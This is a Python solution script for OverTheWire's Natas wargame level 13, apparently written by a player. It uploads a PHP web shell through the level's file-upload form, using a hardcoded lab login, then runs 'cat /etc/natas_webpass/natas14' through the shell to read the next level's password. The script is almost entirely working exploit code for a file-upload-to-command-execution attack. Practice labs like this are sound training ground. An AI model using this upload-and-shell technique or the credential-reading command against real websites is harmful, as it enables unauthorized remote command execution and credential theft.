#!/usr/bin/env python3

import requests
import re

req = requests.Session()

username = "natas13"
password = "jmLTY0qiPZBbaKc9341cqPQZBJv7MQbY"
url = "http://%s.natas.labs.overthewire.org/" % username


files = {"uploadedfile": open("shell.php","rb")}
data = {"filename" : "shell.php","MAX_FILE_SIZE": "1000"}
req_post = req.post(url,auth=(username,password),data=data,files=files)
# print(req_post.text)


filename = re.findall('<a href="(.*)">upload/',req_post.text)[0]
req_get = req.get(url+filename+"?cmd=cat /etc/natas_webpass/natas14",auth=(username,password))
print(req_get.text[40:])


# nxt_pass = re.findall("The password for natas12 is (.*)<",req_get.text)
# print(nxt_pass[0])
